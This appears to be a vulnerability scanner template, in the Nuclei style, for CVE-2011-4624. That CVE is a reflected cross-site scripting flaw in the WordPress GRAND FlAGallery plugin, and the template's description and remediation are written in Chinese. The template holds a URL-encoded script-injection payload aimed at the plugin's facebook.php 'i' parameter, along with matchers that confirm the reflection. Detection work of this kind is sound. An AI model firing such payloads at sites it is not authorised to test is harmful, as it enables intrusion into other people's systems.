id: CVE-2011-4624
info:
  name: GRAND FlAGallery 1.57 - Reflected Cross-Site Scripting
  author:
  - l0ne1y
  tags:
  - cve
  - cve2011
  - wordpress
  - xss
  - wp-plugin
  description: |-
    Wordpress Plugin  GRAND FlAGallery ‘facebook.php’ 跨站脚本漏洞
    WordPress是WordPress软件基金会的一套使用PHP语言开发的博客平台，该平台支持在PHP和MySQL的服务器上架设个人博客网站。GRAND FlAGallery（flash-album-gallery）是其中的一个集图片库、视频库和音乐专辑于一体的媒体插件。

    WordPress GRAND FlAGallery插件1.56及之前版本的facebook.php脚本中存在跨站脚本漏洞。远程攻击者可借助‘i’参数利用该漏洞注入任意Web脚本或HTML。
  reference:
  - https://nvd.nist.gov/vuln/detail/cve-2011-4624
  - http://archives.neohapsis.com/archives/bugtraq/2011-12/0180.html
  - http://www.openwall.com/lists/oss-security/2011/12/23/2
  - http://plugins.trac.wordpress.org/changeset/469785
  severity: medium
  classification:
    cve-id:
    - cve-2011-4624
  remediation: |-
    官方修复方案：
    1.目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接：
    https://wordpress.org/plugins/flash-album-gallery/changelog/
requests:
- matchers:
  - type: word
    part: body
    words:
    - </script><script>alert(document.domain)</script>
  - type: word
    part: header
    words:
    - text/html
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-content/plugins/flash-album-gallery/facebook.php?i=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
  method: GET
